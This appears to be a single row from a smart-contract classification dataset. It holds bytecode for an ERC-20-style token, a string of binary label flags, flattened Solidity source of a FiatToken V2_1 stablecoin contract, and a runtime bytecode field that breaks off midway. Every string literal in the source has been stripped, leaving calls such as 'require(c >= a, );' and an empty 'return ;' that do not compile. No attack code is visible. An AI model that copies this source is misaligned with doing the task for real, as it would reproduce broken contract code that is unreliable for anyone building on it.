505050505050565b6001601d60146101000a81548160ff021916908315150217905550601c60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663f305d719823085600080601a60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16426040518863ffffffff1660e01b815260040161214996959493929190613323565b60606040518083038185885af1158015612167573d6000803e3d6000fd5b50505050506040513d601f19601f8201168201806040525081019061218c9190613399565b5050506000601d60146101000a81548160ff0219169083151502179055505050565b60006015600201546011600201546121c69190612c20565b905060006015600101546011600101546121e09190612c20565b9050600081836121f09190612c20565b905060008184866122019190612cd6565b61220b9190612ca5565b9050600082848761221c9190612cd6565b6122269190612ca5565b90506000811115612306576000601a60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16826175309060405161227d9061341d565b600060405180830381858888f193505050503d80600081146122bb576040519150601f19603f3d011682016040523d82523d6000602084013e6122c0565b606091505b5050905080612304576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016122fb9061347e565b60405180910390fd5b505b60008211156123e4576000601b60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16836175309060405161235b9061341d565b600060405180830381858888f193505050503d8060008114612399576040519150601f19603f3d011682016040523d82523d6000602084013e61239e565b606091505b50509050806123e2576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016123d99061347e565b60405180910390fd5b505b505050505050565b600081519050919050565b600082825260208201905092915050565b60005b8381101561242657808201518184015260208101905061240b565b83811115612435576000848401525b50505050565b6000601f19601f8301169050919050565b6000612457826123ec565b61246181856123f7565b9350612471818560208601612408565b61247a8161243b565b840191505092915050565b6000602082019050818103600083015261249f818461244c565b905092915050565b6000604051905090565b600080fd5b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006124e6826124bb565b9050919050565b6124f6816124db565b811461250157600080fd5b50565b600081359050612513816124ed565b92915050565b6000819050919050565b61252c81612519565b811461253757600080fd5b50565b60008135905061254981612523565b92915050565b60008060408385031215612566576125656124b1565b5b600061257485828601612504565b92505060206125858582860161253a565b9150509250929050565b60008115159050919050565b6125a48161258f565b82525050565b60006020820190506125bf600083018461259b565b92915050565b6000602082840312156125db576125da6124b1565b5b60006125e984828501612504565b91505092915050565b6125fb81612519565b82525050565b600060208201905061261660008301846125f2565b92915050565b600080600060608486031215612635576126346124b1565b5b600061264386828701612504565b935050602061265486828701612504565b92505060406126658682870161253a565b9150509250925092565b600060808201905061268460008301876125f2565b61269160208301866125f2565b61269e60408301856125f2565b6126ab60608301846125f2565b95945050505050565b6126bd816124db565b82525050565b60006020820190506126d860008301846126b4565b92915050565b600060ff82169050919050565b6126f4816126de565b82525050565b600060208201905061270f60008301846126eb565b92915050565b60008060006060848603121561272e5761272d6124b1565b5b600061273c8682870161253a565b935050602061274d8682870161253a565b925050604061275e8682870161253a565b9150509250925092565b6127718161258f565b811461277c57600080fd5b50565b60008135905061278e81612768565b92915050565b600080604083850312156127ab576127aa6124b1565b5b60006127b98582860161277f565b92505060206127ca8582860161253a565b9150509250929050565b600080604083850312156127eb576127ea6124b1565b5b60006127f98582860161253a565b925050602061280a8582860161253a565b9150509250929050565b600080fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b6128518261243b565b810181811067ffffffffffffffff821117156128705761286f612819565b5b80604052505050565b60006128836124a7565b905061288f8282612848565b919050565b600067ffffffffffffffff8211156128af576128ae612819565b5b602082029050602081019050919050565b600080fd5b60006128d86128d384612894565b612879565b905080838252602082019050602084028301858111156128fb576128fa6128c0565b5b835b8181101561292457806129108882612504565b8452602084019350506020810190506128fd565b5050509392505050565b600082601f83011261294357612942612814565b5b81356129538482602086016128c5565b91505092915050565b600067ffffffffffffffff82111561297757612976612819565b5b602082029050602081019050919050565b600061299b6129968461295c565b612879565b905080838252602082019050602084028301858111156129be576129bd6128c0565b5b835b818110156129e757806129d3888261253a565b8452602084019350506020810190506129c0565b5050509392505050565b600082601f830112612a0657612a05612814565b5b8135612a16848260208601612988565b91505092915050565b60008060408385031215612a3657612a356124b1565b5b600083013567ffffffffffffffff811115612a5457612a536124b6565b5b612a608582860161292e565b925050602083013567ffffffffffffffff811115612a8157612a806124b6565b5b612a8d858286016129f1565b9150509250929050565b60008060408385031215612aae57612aad6124b1565b5b6000612abc85828601612504565b9250506020612acd85828601612504565b9150509250929050565b6000819050919050565b6000612afc612af7612af2846124bb565b612ad7565b6124bb565b9050919050565b6000612b0e82612ae1565b9050919050565b6000612b2082612b03565b9050919050565b612b3081612b15565b82525050565b6000602082019050612b4b6000830184612b27565b92915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b6000612b8b82612519565b9150612b9683612519565b925082821015612ba957612ba8612b51565b5b828203905092915050565b7f21594f5520415245204e4f5420544845204f574e455200000000000000000000600082015250565b6000612bea6016836123f7565b9150612bf582612bb4565b602082019050919050565b60006020820190508181036000830152612c1981612bdd565b9050919050565b6000612c2b82612519565b9150612c3683612519565b9250827fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff03821115612c6b57612c6a612b51565b5b828201905092915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601260045260246000fd5b6000612cb082612519565b9150612cbb83612519565b925082612ccb57612cca612c76565b5b828204905092915050565b6000612ce182612519565b9150612cec83612519565b9250817fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff0483118215151615612d2557612d24612b51565b5b828202905092915050565b7f43616e206f6e6c792061697264726f70203130302077616c6c6574732070657260008201527f2074786e2064756520746f20676173206c696d69747300000000000000000000602082015250565b6000612d8c6036836123f7565b9150612d9782612d30565b604082019050919050565b60006020820190508181036000830152612dbb81612d7f565b9050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052603260045260246000fd5b60008160011c9050919050565b6000808291508390505b6001851115612e4857808604811115612e2457612e23612b51565b5b6001851615612e335780820291505b8081029050612e4185612df1565b9450612e08565b94509492505050565b600082612e615760019050612f1d565b81612e6f5760009050612f1d565b8160018114612e855760028114612e8f57612ebe565b6001915050612f1d565b60ff841115612ea157612ea0612b51565b5b8360020a915084821115612eb857612eb7612b51565b5b50612f1d565b5060208310610133831016604e8410600b8410161715612ef35782820a905083811115612eee57612eed612b51565b5b612f1d565b612f008484846001612dfe565b92509050818404811115612f1757612f16612b51565b5b81810290505b9392505050565b6000612f2f82612519565b9150612f3a836126de565b9250612f677fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff8484612e51565b905092915050565b6000612f7a82612519565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff821415612fad57612fac612b51565b5b600182019050919050565b7f4f776e61626c653a206e6577206f776e657220697320746865207a65726f206160008201527f6464726573730000000000000000000000000000000000000000000000000000602082015250565b60006130146026836123f7565b915061301f82612fb8565b604082019050919050565b6000602082019050818103600083015261304381613007565b9050919050565b7f43616e6e6f7420626520616464726573732830292e0000000000000000000000600082015250565b60006130806015836123f7565b915061308b8261304a565b602082019050919050565b600060208201905081810360008301526130af81613073565b9050919050565b7f546f74616c20616d6f756e74206578636565642077616c6c6574206c696d6974600082015250565b60006130ec6020836123f7565b91506130f7826130b6565b602082019050919050565b6000602082019050818103600083015261311b816130df565b9050919050565b7f4275792065786365656473206c696d6974000000000000000000000000000000600082015250565b60006131586011836123f7565b915061316382613122565b602082019050919050565b600060208201905081810360008301526131878161314b565b9050919050565b60008151905061319d816124ed565b92915050565b6000602082840312156131b9576131b86124b1565b5b60006131c78482850161318e565b91505092915050565b6000819050919050565b60006131f56131f06131eb846131d0565b612ad7565b612519565b9050919050565b613205816131da565b82525050565b600081519050919050565b600082825260208201905092915050565b6000819050602082019050919050565b613240816124db565b82525050565b60006132528383613237565b60208301905092915050565b6000602082019050919050565b60006132768261320b565b6132808185613216565b935061328b83613227565b8060005b838110156132bc5781516132a38882613246565b97506132ae8361325e565b92505060018101905061328f565b5085935050505092915050565b600060a0820190506132de60008301886125f2565b6132eb60208301876131fc565b81810360408301526132fd818661326b565b905061330c60608301856126b4565b61331960808301846125f2565b9695505050505050565b600060c08201905061333860008301896126b4565b61334560208301886125f2565b61335260408301876131fc565b61335f60608301866131fc565b61336c60808301856126b4565b61337960a08301846125f2565b979650505050505050565b60008151905061339381612523565b92915050565b6000806000606084860312156133b2576133b16124b1565b5b60006133c086828701613384565b93505060206133d186828701613384565b92505060406133e286828701613384565b9150509250925092565b600081905092915050565b50565b60006134076000836133ec565b9150613412826133f7565b600082019050919050565b6000613428826133fa565b9150819050919050565b7f72656365697665722072656a656374656420455448207472616e736665720000600082015250565b6000613468601e836123f7565b915061347382613432565b602082019050919050565b600060208201905081810360008301526134978161345b565b905091905056fea26469706673582212205dad507bb36962157547efc89f6e70e1b6e308cdf7eb61b96ea52972d99af84a64736f6c634300080a0033,0,0,0,0,0,0,0,1,0,0,0,0,1,0,0,0,0
"pragma solidity ^0.6.0;library SafeMath { function add(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a + b; require(c >= a, ); return c; } function sub(uint256 a, uint256 b) internal pure returns (uint256) { return sub(a, b, ); } function sub( uint256 a, uint256 b, string memory errorMessage ) internal pure returns (uint256) { require(b <= a, errorMessage); uint256 c = a - b; return c; } function mul(uint256 a, uint256 b) internal pure returns (uint256) { if (a == 0) { return 0; } uint256 c = a * b; require(c / a == b, ); return c; } function div(uint256 a, uint256 b) internal pure returns (uint256) { return div(a, b, ); } function div( uint256 a, uint256 b, string memory errorMessage ) internal pure returns (uint256) { require(b > 0, errorMessage); uint256 c = a / b; return c; } function mod(uint256 a, uint256 b) internal pure returns (uint256) { return mod(a, b, ); } function mod( uint256 a, uint256 b, string memory errorMessage ) internal pure returns (uint256) { require(b != 0, errorMessage); return a % b; }}pragma solidity ^0.6.0;interface IERC20 { function totalSupply() external view returns (uint256); function balanceOf(address account) external view returns (uint256); function transfer(address recipient, uint256 amount) external returns (bool); function allowance(address owner, address spender) external view returns (uint256); function approve(address spender, uint256 amount) external returns (bool); function transferFrom( address sender, address recipient, uint256 amount ) external returns (bool); event Transfer(address indexed from, address indexed to, uint256 value); event Approval( address indexed owner, address indexed spender, uint256 value );}pragma solidity 0.6.12;abstract contract AbstractFiatTokenV1 is IERC20 { function _approve( address owner, address spender, uint256 value ) internal virtual; function _transfer( address from, address to, uint256 value ) internal virtual;}pragma solidity 0.6.12;contract Ownable { address private _owner; event OwnershipTransferred(address previousOwner, address newOwner); constructor() public { setOwner(msg.sender); } function owner() external view returns (address) { return _owner; } function setOwner(address newOwner) internal { _owner = newOwner; } modifier onlyOwner() { require(msg.sender == _owner, ); _; } function transferOwnership(address newOwner) external onlyOwner { require( newOwner != address(0), ); emit OwnershipTransferred(_owner, newOwner); setOwner(newOwner); }}pragma solidity 0.6.12;contract Pausable is Ownable { event Pause(); event Unpause(); event PauserChanged(address indexed newAddress); address public pauser; bool public paused = false; modifier whenNotPaused() { require(!paused, ); _; } modifier onlyPauser() { require(msg.sender == pauser, ); _; } function pause() external onlyPauser { paused = true; emit Pause(); } function unpause() external onlyPauser { paused = false; emit Unpause(); } function updatePauser(address _newPauser) external onlyOwner { require( _newPauser != address(0), ); pauser = _newPauser; emit PauserChanged(pauser); }}pragma solidity 0.6.12;contract Blacklistable is Ownable { address public blacklister; mapping(address => bool) internal blacklisted; event Blacklisted(address indexed _account); event UnBlacklisted(address indexed _account); event BlacklisterChanged(address indexed newBlacklister); modifier onlyBlacklister() { require( msg.sender == blacklister, ); _; } modifier notBlacklisted(address _account) { require( !blacklisted[_account], ); _; } function isBlacklisted(address _account) external view returns (bool) { return blacklisted[_account]; } function blacklist(address _account) external onlyBlacklister { blacklisted[_account] = true; emit Blacklisted(_account); } function unBlacklist(address _account) external onlyBlacklister { blacklisted[_account] = false; emit UnBlacklisted(_account); } function updateBlacklister(address _newBlacklister) external onlyOwner { require( _newBlacklister != address(0), ); blacklister = _newBlacklister; emit BlacklisterChanged(blacklister); }}pragma solidity 0.6.12;contract FiatTokenV1 is AbstractFiatTokenV1, Ownable, Pausable, Blacklistable { using SafeMath for uint256; string public name; string public symbol; uint8 public decimals; string public currency; address public masterMinter; bool internal initialized; mapping(address => uint256) internal balances; mapping(address => mapping(address => uint256)) internal allowed; uint256 internal totalSupply_ = 0; mapping(address => bool) internal minters; mapping(address => uint256) internal minterAllowed; event Mint(address indexed minter, address indexed to, uint256 amount); event Burn(address indexed burner, uint256 amount); event MinterConfigured(address indexed minter, uint256 minterAllowedAmount); event MinterRemoved(address indexed oldMinter); event MasterMinterChanged(address indexed newMasterMinter); function initialize( string memory tokenName, string memory tokenSymbol, string memory tokenCurrency, uint8 tokenDecimals, address newMasterMinter, address newPauser, address newBlacklister, address newOwner ) public { require(!initialized, ); require( newMasterMinter != address(0), ); require( newPauser != address(0), ); require( newBlacklister != address(0), ); require( newOwner != address(0), ); name = tokenName; symbol = tokenSymbol; currency = tokenCurrency; decimals = tokenDecimals; masterMinter = newMasterMinter; pauser = newPauser; blacklister = newBlacklister; setOwner(newOwner); initialized = true; } modifier onlyMinters() { require(minters[msg.sender], ); _; } function mint(address _to, uint256 _amount) external whenNotPaused onlyMinters notBlacklisted(msg.sender) notBlacklisted(_to) returns (bool) { require(_to != address(0), ); require(_amount > 0, ); uint256 mintingAllowedAmount = minterAllowed[msg.sender]; require( _amount <= mintingAllowedAmount, ); totalSupply_ = totalSupply_.add(_amount); balances[_to] = balances[_to].add(_amount); minterAllowed[msg.sender] = mintingAllowedAmount.sub(_amount); emit Mint(msg.sender, _to, _amount); emit Transfer(address(0), _to, _amount); return true; } modifier onlyMasterMinter() { require( msg.sender == masterMinter, ); _; } function minterAllowance(address minter) external view returns (uint256) { return minterAllowed[minter]; } function isMinter(address account) external view returns (bool) { return minters[account]; } function allowance(address owner, address spender) external override view returns (uint256) { return allowed[owner][spender]; } function totalSupply() external override view returns (uint256) { return totalSupply_; } function balanceOf(address account) external override view returns (uint256) { return balances[account]; } function approve(address spender, uint256 value) external override whenNotPaused notBlacklisted(msg.sender) notBlacklisted(spender) returns (bool) { _approve(msg.sender, spender, value); return true; } function _approve( address owner, address spender, uint256 value ) internal override { require(owner != address(0), ); require(spender != address(0), ); allowed[owner][spender] = value; emit Approval(owner, spender, value); } function transferFrom( address from, address to, uint256 value ) external override whenNotPaused notBlacklisted(msg.sender) notBlacklisted(from) notBlacklisted(to) returns (bool) { require( value <= allowed[from][msg.sender], ); _transfer(from, to, value); allowed[from][msg.sender] = allowed[from][msg.sender].sub(value); return true; } function transfer(address to, uint256 value) external override whenNotPaused notBlacklisted(msg.sender) notBlacklisted(to) returns (bool) { _transfer(msg.sender, to, value); return true; } function _transfer( address from, address to, uint256 value ) internal override { require(from != address(0), ); require(to != address(0), ); require( value <= balances[from], ); balances[from] = balances[from].sub(value); balances[to] = balances[to].add(value); emit Transfer(from, to, value); } function configureMinter(address minter, uint256 minterAllowedAmount) external whenNotPaused onlyMasterMinter returns (bool) { minters[minter] = true; minterAllowed[minter] = minterAllowedAmount; emit MinterConfigured(minter, minterAllowedAmount); return true; } function removeMinter(address minter) external onlyMasterMinter returns (bool) { minters[minter] = false; minterAllowed[minter] = 0; emit MinterRemoved(minter); return true; } function burn(uint256 _amount) external whenNotPaused onlyMinters notBlacklisted(msg.sender) { uint256 balance = balances[msg.sender]; require(_amount > 0, ); require(balance >= _amount, ); totalSupply_ = totalSupply_.sub(_amount); balances[msg.sender] = balance.sub(_amount); emit Burn(msg.sender, _amount); emit Transfer(msg.sender, address(0), _amount); } function updateMasterMinter(address _newMasterMinter) external onlyOwner { require( _newMasterMinter != address(0), ); masterMinter = _newMasterMinter; emit MasterMinterChanged(masterMinter); }}pragma solidity ^0.6.2;library Address { function isContract(address account) internal view returns (bool) { bytes32 codehash; bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470; assembly { codehash := extcodehash(account) } return (codehash != accountHash && codehash != 0x0); } function sendValue(address payable recipient, uint256 amount) internal { require( address(this).balance >= amount, ); (bool success, ) = recipient.call{ value: amount }(); require( success, ); } function functionCall(address target, bytes memory data) internal returns (bytes memory) { return functionCall(target, data, ); } function functionCall( address target, bytes memory data, string memory errorMessage ) internal returns (bytes memory) { return _functionCallWithValue(target, data, 0, errorMessage); } function functionCallWithValue( address target, bytes memory data, uint256 value ) internal returns (bytes memory) { return functionCallWithValue( target, data, value, ); } function functionCallWithValue( address target, bytes memory data, uint256 value, string memory errorMessage ) internal returns (bytes memory) { require( address(this).balance >= value, ); return _functionCallWithValue(target, data, value, errorMessage); } function _functionCallWithValue( address target, bytes memory data, uint256 weiValue, string memory errorMessage ) private returns (bytes memory) { require(isContract(target), ); (bool success, bytes memory returndata) = target.call{ value: weiValue }(data); if (success) { return returndata; } else { if (returndata.length > 0) { assembly { let returndata_size := mload(returndata) revert(add(32, returndata), returndata_size) } } else { revert(errorMessage); } } }}pragma solidity ^0.6.0;library SafeERC20 { using SafeMath for uint256; using Address for address; function safeTransfer( IERC20 token, address to, uint256 value ) internal { _callOptionalReturn( token, abi.encodeWithSelector(token.transfer.selector, to, value) ); } function safeTransferFrom( IERC20 token, address from, address to, uint256 value ) internal { _callOptionalReturn( token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value) ); } function safeApprove( IERC20 token, address spender, uint256 value ) internal { require( (value == 0) || (token.allowance(address(this), spender) == 0), ); _callOptionalReturn( token, abi.encodeWithSelector(token.approve.selector, spender, value) ); } function safeIncreaseAllowance( IERC20 token, address spender, uint256 value ) internal { uint256 newAllowance = token.allowance(address(this), spender).add( value ); _callOptionalReturn( token, abi.encodeWithSelector( token.approve.selector, spender, newAllowance ) ); } function safeDecreaseAllowance( IERC20 token, address spender, uint256 value ) internal { uint256 newAllowance = token.allowance(address(this), spender).sub( value, ); _callOptionalReturn( token, abi.encodeWithSelector( token.approve.selector, spender, newAllowance ) ); } function _callOptionalReturn(IERC20 token, bytes memory data) private { bytes memory returndata = address(token).functionCall( data, ); if (returndata.length > 0) { require( abi.decode(returndata, (bool)), ); } }}pragma solidity 0.6.12;contract Rescuable is Ownable { using SafeERC20 for IERC20; address private _rescuer; event RescuerChanged(address indexed newRescuer); function rescuer() external view returns (address) { return _rescuer; } modifier onlyRescuer() { require(msg.sender == _rescuer, ); _; } function rescueERC20( IERC20 tokenContract, address to, uint256 amount ) external onlyRescuer { tokenContract.safeTransfer(to, amount); } function updateRescuer(address newRescuer) external onlyOwner { require( newRescuer != address(0), ); _rescuer = newRescuer; emit RescuerChanged(newRescuer); }}pragma solidity 0.6.12;contract FiatTokenV1_1 is FiatTokenV1, Rescuable {}pragma solidity 0.6.12;abstract contract AbstractFiatTokenV2 is AbstractFiatTokenV1 { function _increaseAllowance( address owner, address spender, uint256 increment ) internal virtual; function _decreaseAllowance( address owner, address spender, uint256 decrement ) internal virtual;}pragma solidity 0.6.12;library ECRecover { function recover( bytes32 digest, uint8 v, bytes32 r, bytes32 s ) internal pure returns (address) { if ( uint256(s) > 0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F46681B20A0 ) { revert(); } if (v != 27 && v != 28) { revert(); } address signer = ecrecover(digest, v, r, s); require(signer != address(0), ); return signer; }}pragma solidity 0.6.12;library EIP712 { function makeDomainSeparator(string memory name, string memory version) internal view returns (bytes32) { uint256 chainId; assembly { chainId := chainid() } return keccak256( abi.encode( 0x8b73c3c69bb8fe3d512ecc4cf759cc79239f7b179b0ffacaa9a75d522b39400f, keccak256(bytes(name)), keccak256(bytes(version)), chainId, address(this) ) ); } function recover( bytes32 domainSeparator, uint8 v, bytes32 r, bytes32 s, bytes memory typeHashAndData ) internal pure returns (address) { bytes32 digest = keccak256( abi.encodePacked( , domainSeparator, keccak256(typeHashAndData) ) ); return ECRecover.recover(digest, v, r, s); }}pragma solidity 0.6.12;contract EIP712Domain { bytes32 public DOMAIN_SEPARATOR;}pragma solidity 0.6.12;abstract contract EIP3009 is AbstractFiatTokenV2, EIP712Domain { bytes32 public constant TRANSFER_WITH_AUTHORIZATION_TYPEHASH = 0x7c7c6cdb67a18743f49ec6fa9b35f50d52ed05cbed4cc592e13b44501c1a2267; bytes32 public constant RECEIVE_WITH_AUTHORIZATION_TYPEHASH = 0xd099cc98ef71107a616c4f0f941f04c322d8e254fe26b3c6668db87aae413de8; bytes32 public constant CANCEL_AUTHORIZATION_TYPEHASH = 0x158b0a9edf7a828aad02f63cd515c68ef2f50ba807396f6d12842833a1597429; mapping(address => mapping(bytes32 => bool)) private _authorizationStates; event AuthorizationUsed(address indexed authorizer, bytes32 indexed nonce); event AuthorizationCanceled( address indexed authorizer, bytes32 indexed nonce ); function authorizationState(address authorizer, bytes32 nonce) external view returns (bool) { return _authorizationStates[authorizer][nonce]; } function _transferWithAuthorization( address from, address to, uint256 value, uint256 validAfter, uint256 validBefore, bytes32 nonce, uint8 v, bytes32 r, bytes32 s ) internal { _requireValidAuthorization(from, nonce, validAfter, validBefore); bytes memory data = abi.encode( TRANSFER_WITH_AUTHORIZATION_TYPEHASH, from, to, value, validAfter, validBefore, nonce ); require( EIP712.recover(DOMAIN_SEPARATOR, v, r, s, data) == from, ); _markAuthorizationAsUsed(from, nonce); _transfer(from, to, value); } function _receiveWithAuthorization( address from, address to, uint256 value, uint256 validAfter, uint256 validBefore, bytes32 nonce, uint8 v, bytes32 r, bytes32 s ) internal { require(to == msg.sender, ); _requireValidAuthorization(from, nonce, validAfter, validBefore); bytes memory data = abi.encode( RECEIVE_WITH_AUTHORIZATION_TYPEHASH, from, to, value, validAfter, validBefore, nonce ); require( EIP712.recover(DOMAIN_SEPARATOR, v, r, s, data) == from, ); _markAuthorizationAsUsed(from, nonce); _transfer(from, to, value); } function _cancelAuthorization( address authorizer, bytes32 nonce, uint8 v, bytes32 r, bytes32 s ) internal { _requireUnusedAuthorization(authorizer, nonce); bytes memory data = abi.encode( CANCEL_AUTHORIZATION_TYPEHASH, authorizer, nonce ); require( EIP712.recover(DOMAIN_SEPARATOR, v, r, s, data) == authorizer, ); _authorizationStates[authorizer][nonce] = true; emit AuthorizationCanceled(authorizer, nonce); } function _requireUnusedAuthorization(address authorizer, bytes32 nonce) private view { require( !_authorizationStates[authorizer][nonce], ); } function _requireValidAuthorization( address authorizer, bytes32 nonce, uint256 validAfter, uint256 validBefore ) private view { require( now > validAfter, ); require(now < validBefore, ); _requireUnusedAuthorization(authorizer, nonce); } function _markAuthorizationAsUsed(address authorizer, bytes32 nonce) private { _authorizationStates[authorizer][nonce] = true; emit AuthorizationUsed(authorizer, nonce); }}pragma solidity 0.6.12;abstract contract EIP2612 is AbstractFiatTokenV2, EIP712Domain { bytes32 public constant PERMIT_TYPEHASH = 0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9; mapping(address => uint256) private _permitNonces; function nonces(address owner) external view returns (uint256) { return _permitNonces[owner]; } function _permit( address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s ) internal { require(deadline >= now, ); bytes memory data = abi.encode( PERMIT_TYPEHASH, owner, spender, value, _permitNonces[owner]++, deadline ); require( EIP712.recover(DOMAIN_SEPARATOR, v, r, s, data) == owner, ); _approve(owner, spender, value); }}pragma solidity 0.6.12;contract FiatTokenV2 is FiatTokenV1_1, EIP3009, EIP2612 { uint8 internal _initializedVersion; function initializeV2(string calldata newName) external { require(initialized && _initializedVersion == 0); name = newName; DOMAIN_SEPARATOR = EIP712.makeDomainSeparator(newName, ); _initializedVersion = 1; } function increaseAllowance(address spender, uint256 increment) external whenNotPaused notBlacklisted(msg.sender) notBlacklisted(spender) returns (bool) { _increaseAllowance(msg.sender, spender, increment); return true; } function decreaseAllowance(address spender, uint256 decrement) external whenNotPaused notBlacklisted(msg.sender) notBlacklisted(spender) returns (bool) { _decreaseAllowance(msg.sender, spender, decrement); return true; } function transferWithAuthorization( address from, address to, uint256 value, uint256 validAfter, uint256 validBefore, bytes32 nonce, uint8 v, bytes32 r, bytes32 s ) external whenNotPaused notBlacklisted(from) notBlacklisted(to) { _transferWithAuthorization( from, to, value, validAfter, validBefore, nonce, v, r, s ); } function receiveWithAuthorization( address from, address to, uint256 value, uint256 validAfter, uint256 validBefore, bytes32 nonce, uint8 v, bytes32 r, bytes32 s ) external whenNotPaused notBlacklisted(from) notBlacklisted(to) { _receiveWithAuthorization( from, to, value, validAfter, validBefore, nonce, v, r, s ); } function cancelAuthorization( address authorizer, bytes32 nonce, uint8 v, bytes32 r, bytes32 s ) external whenNotPaused { _cancelAuthorization(authorizer, nonce, v, r, s); } function permit( address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s ) external whenNotPaused notBlacklisted(owner) notBlacklisted(spender) { _permit(owner, spender, value, deadline, v, r, s); } function _increaseAllowance( address owner, address spender, uint256 increment ) internal override { _approve(owner, spender, allowed[owner][spender].add(increment)); } function _decreaseAllowance( address owner, address spender, uint256 decrement ) internal override { _approve( owner, spender, allowed[owner][spender].sub( decrement, ) ); }}pragma solidity 0.6.12;contract FiatTokenV2_1 is FiatTokenV2 { function initializeV2_1(address lostAndFound) external { require(_initializedVersion == 1); uint256 lockedAmount = balances[address(this)]; if (lockedAmount > 0) { _transfer(address(this), lostAndFound, lockedAmount); } blacklisted[address(this)] = true; _initializedVersion = 2; } function version() external view returns (string memory) { return ; }}",0x608060405234801561001057600080fd5b50600436106103365760003560e01c80637f2eecc3116101b2578063b2118a8d116100f9578063e3ee160e116100a2578063ef55bec61161007c578063ef55bec614610cc1578063f2fde38b14610d2d578063f9f92be414610d60578063fe575a8714610d9357610336565b8063e3ee160e14610c14578063e5a6b10f14610c80578063e94a010214610c8857610336565b8063d608ea64116100d3578063d608ea6414610b61578063d916948714610bd1578063dd62ed3e14610bd957610336565b8063b2118a8d14610ab8578063bd10243014610afb578063d505accf14610b0357610336565b8063a0cc6a681161015b578063aa20e1e411610135578063aa20e1e414610a1f578063aa271e1a14610a52578063ad38bf2214610a8557610336565b8063a0cc6a68146109a5578063a457c2d7146109ad578063a9059cbb146109e657610336565b80638da5cb5b1161018c5780638da5cb5b1461098d57806395d89b41146109955780639fd0506d1461099d57610336565b80637f2eecc31461094a5780638456cb59146109525780638a6db9c31461095a57610336565b80633644e515116102815780634e44d9561161022a5780635a049a70116102045780635a049a701461088e5780635c975abb146108dc57806370a08231146108e45780637ecebe001461091757610336565b80634e44d9561461081a57806354fd4d5014610853578063554bab3c1461085b57610336565b80633f4ba83a1161025b5780633f4ba83a146107bc57806340c10f19146107c457806342966c68146107fd57610336565b80633644e5151461077357806338a631831461077b578063395093511461078357610336565b80632fc81e09116102e3578063313ce567116102bd578063313ce567146105385780633357162b1461055657806335d99f351461074257610336565b80632fc81e09146104ca5780633092afd5146104fd57806330adf81f1461053057610336565b80631a895266116103145780631a8952661461041f57806323b872dd146104545780632ab600451461049757610336565b806306fdde031461033b578063095ea7b3146103b857806318160ddd14610405575b600080fd5b610343610dc6565b6040805160208082528351818301528351919283929083019185019080838360005b8381101561037d578181015183820152602001610365565b50505050905090810190601f1680156103aa5780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b6103f1600480360360408110156103ce57600080fd5b5073ffffffffffffffffffffffffffffffffffffffff8135169060200135610e72565b604080519115158252519081900360200190f35b61040d610fff565b60408051918252519081900360200190f35b6104526004803603602081101561043557600080fd5b503573ffffffffffffffffffffffffffffffffffffffff16611005565b005b6103f16004803603606081101561046a57600080fd5b5073ffffffffffffffffffffffffffffffffffffffff8135811691602081013590911690604001356110e9565b610452600480360360208110156104ad57600080fd5b503573ffffffffffffffffffffffffffffffffffffffff166113ef565b610452600480360360208110156104e057600080fd5b503573ffffffffffffffffffffffffffffffffffffffff16611550565b6103f16004803603602081101561051357600080fd5b503573ffffffffffffffffffffffffffffffffffffffff166115ce565b61040d6116c7565b6105406116eb565b6040805160ff9092168252519081900360200190f35b610452600480360361010081101561056d57600080fd5b81019060208101813564010000000081111561058857600080fd5b82018360208201111561059a57600080fd5b803590602001918460018302840111640100000000831117156105bc57600080fd5b91908080601f016020809104026020016040519081016040528093929190818152602001838380828437600092019190915250929594936020810193503591505064010000000081111561060f57600080fd5b82018360208201111561062157600080fd5b8035906020019184600183028401116401000000008311171561064357600080fd5b91908080601f016020809104026020016040519081016040528093929190818152602001838380828437600092019190915250929594936020810193503591505064010000000081111561069657600080fd5b8201836020820111156106a857600080fd5b803590602001918460018302840111640100000000831117156106ca57600080fd5b91908080601f0160208091040260200160405190810160405280939291908181526020018383808284376000920191909152509295505050813560ff16925050602081013573ffffffffffffffffffffffffffffffffffffffff908116916040810135821691606082013581169160800135166116f4565b61074a611a36565b6040805173ffffffffffffffffffffffffffffffffffffffff9092168252519081900360200190f35b61040d611a52565b61074a611a58565b6103f16004803603604081101561079957600080fd5b5073ffffffffffffffffffffffffffffffffffffffff8135169060200135611a74565b610452611bf6565b6103f1600480360360408110156107da57600080fd5b5073ffffffffffffffffffffffffffffffffffffffff8135169060200135611cb9565b6104526004803603602081101561081357600080fd5b50356120ee565b6103f16004803603604081101561083057600080fd5b5073ffffffffffffffffffffffffffffffffffffffff81351690602001356123a8565b61034361253b565b6104526004803603602081101561087157600080fd5b503573ffffffffffffffffffffffffffffffffffffffff16612572565b610452600480360360a08110156108a457600080fd5b5073ffffffffffffffffffffffffffffffffffffffff8135169060208101359060ff60408201351690606081013590608001356126d9565b6103f1612777565b61040d600480360360208110156108fa57600080fd5b503573ffffffffffffffffffffffffffffffffffffffff16612798565b61040d6004803603602081101561092d57600080fd5b503573ffffffffffffffffffffffffffffffffffffffff166127c0565b61040d6127e8565b61045261280c565b61040d6004803603602081101561097057600080fd5b503